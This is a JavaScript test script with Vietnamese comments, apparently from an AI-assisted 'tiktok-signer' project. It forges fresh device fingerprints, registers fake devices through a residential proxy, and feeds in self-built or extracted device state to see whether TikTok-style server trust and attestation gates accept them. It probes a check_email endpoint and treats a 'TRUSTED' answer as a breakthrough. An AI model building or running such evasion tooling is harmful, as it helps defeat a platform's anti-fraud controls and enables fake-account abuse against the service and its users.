// E-core: "tự sinh device-state offline có tạo được TRUST không?" — matrix trên PC/unidbg, KHÔNG cần phone.
//  Mỗi config: forge fingerprint MỚI + register device_register (nơi server gán trust) + check_email (trust-gate sạch).
//  C0 forge baseline (signer default, keva GET=null)   -> mốc (expect ec7, reproduce W17/t_trust).
//  C1 + keva self-store offline (MSB_KV)               -> metasec TỰ build keva offline có cứu trust?
//  C3 + FEED device-state extract 7665281 (trill)       -> device-state THẬT + fingerprint forge -> server phản ứng?
//  Phân tách: self-derived keva / device-state extract có vượt được gate fingerprint/attestation thật không.
import '../src/net.mjs';  // route fetch qua PROXY_URL (egress residential sạch) — phải trước fetch
import { registerDevice, newIdentity, dsign } from '../src/device.mjs';
import { passportCall, enc, seedCookies } from '../src/login.mjs';
import crypto from 'node:crypto';

const MSSTATE = 'C:/Users/Admin/AppData/Local/Temp/claude/e--tiktok-signer/10ede755-089e-4f64-a120-8e1c13528fdb/scratchpad/attk/msstate_attk';
const V473 = { MSB_VER: '45.7.3', MSB_VERCODE: '2024507030' };

const configs = {
  C0_forge_baseline:   {},
  C1_keva_selfstore:   { MSB_FULLINIT: '1', MSB_KV: '1' },
  C3_feed_extract7665: { MSB_FULLINIT: '1', MSB_KV: '1', MSB_DEVSTATE_DIR: MSSTATE, ...V473 },
};

async function trustGate(dev) {
  const d = await dsign(dev).catch((e) => ({ _err: e }));
  if (!d.device_token) return 'dsign-FAIL:' + (d._err?.message || '');
  seedCookies(d.cookies || {});
  const email = 'ec' + crypto.randomBytes(4).toString('hex') + '@gmail.com';
  const r = await passportCall(dev, d, '/passport/user/check_email_registered', {
    params: { account_sdk_source: 'app', multi_login: '1', email: enc(email), mix_mode: '1' },
  });
  return r.j?.data?.error_code ?? r.j?.message ?? ('http' + r.status);
}
const verdict = (ec) => ec === 7 ? 'UNTRUSTED(ec7)' : (ec === 1011 || ec === 'success' ? '🎉TRUSTED' : '?ec=' + ec);

for (const [name, env] of Object.entries(configs)) {
  console.log(`\n===== ${name}  env=${JSON.stringify(env)} =====`);
  try {
    const id = newIdentity();
    const reg = await registerDevice(id, env);
    console.log(`  register device_id=${reg.device_id} new_user=${reg.new_user}`);
    if (!reg.device_id) { console.log('  register FAIL:', JSON.stringify(reg.raw || {}).slice(0, 200)); continue; }
    const dev = { device_id: reg.device_id, install_id: reg.install_id, id };
    const ec = await trustGate(dev);
    console.log(`  check_email -> ${ec}  => ${verdict(ec)}`);
  } catch (e) { console.log(`  ERR ${e.message}`); }
}
console.log('\n=== DOC: all ec7 => self-derived keva + extract device-state KHÔNG vượt gate fingerprint/attestation thật (server-gate). TRUSTED => breakthrough. ===');
